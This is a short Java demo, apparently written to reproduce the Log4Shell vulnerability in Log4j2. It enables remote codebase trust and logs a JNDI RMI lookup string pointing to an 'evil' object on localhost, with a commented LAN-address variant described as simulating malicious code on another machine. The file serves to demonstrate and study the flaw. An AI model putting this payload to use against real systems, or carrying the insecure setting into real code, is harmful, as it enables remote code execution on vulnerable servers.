package com.example.log4j2demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author youngbear
 * @email youngbear@aliyun.com
 * @date 2021/12/14 21:33
 * @blog https://blog.csdn.net/next_second
 * @github https://github.com/YoungBear
 * @description
 */
public class Log4j2Demo {
    private static final Logger LOGGER = LogManager.getLogger(Log4j2Demo.class);


    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.out.println("begin of print log...");

        String logContent = "${jndi:rmi://127.0.0.1:1099/evil}";
        // 模拟另外一台机器运行恶意代码
//        String logContent = "${jndi:rmi://192.168.3.57:1099/evil}";
        LOGGER.error("hello, {}", logContent);
        System.out.println("end of print log...");
    }
}
